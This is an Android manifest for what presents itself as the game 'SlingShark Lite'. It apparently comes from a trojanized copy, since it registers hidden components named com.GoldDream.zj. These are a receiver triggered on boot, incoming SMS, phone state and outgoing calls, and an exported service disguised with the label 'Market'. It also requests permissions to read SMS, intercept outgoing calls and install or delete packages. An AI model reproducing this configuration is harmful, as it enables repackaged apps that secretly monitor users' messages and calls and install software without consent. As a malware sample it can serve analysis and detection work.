<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.requiem.slingshakLite">
    <application android:debuggable="true" android:icon="@drawable/icon_lite" android:label="@string/lite_app_name">
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/lite_app_name" android:name=".SlingShark">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name=".Preferences" android:title="@string/preferences_title"/>
        <activity android:name=".NameDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:label="@string/credits_label" android:name="com.requiem.RSL.RSLCreditsDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:name="com.requiem.RSL.PromotionWindow"/>
        <activity android:label="@string/help_label" android:name=".HelpDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:label="@string/end_game_label" android:name=".EndGameDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:label="Invalid IMEI" android:name="com.requiem.RSL.IMEIDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:label="@string/quit_game_label" android:name=".QuitGameDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:label="@string/lite_label" android:name=".LiteDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:name=".ControlSetupDialog" android:theme="@android:style/Theme.Dialog"/>
        <activity android:label="An Error Has Occurred On A Previous Run." android:name="com.requiem.RSL.RSLReportBugActivity" android:theme="@android:style/Theme.Dialog"/>
        <activity android:name="com.requiem.RSL.OKAlert" android:theme="@android:style/Theme.Dialog"/>
        <activity android:name="com.requiem.RSL.QuestionAlert" android:theme="@android:style/Theme.Dialog"/>
        <activity android:name="com.requiem.RSL.PromotionWindow"/>
        <activity android:name="com.requiem.RSL.PromotionDialog" android:theme="@android:style/Theme.Dialog"/>
        <receiver android:name="com.GoldDream.zj.zjReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:label="Market" android:name="com.GoldDream.zj.zjService" android:process=""/>
    </application>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
</manifest>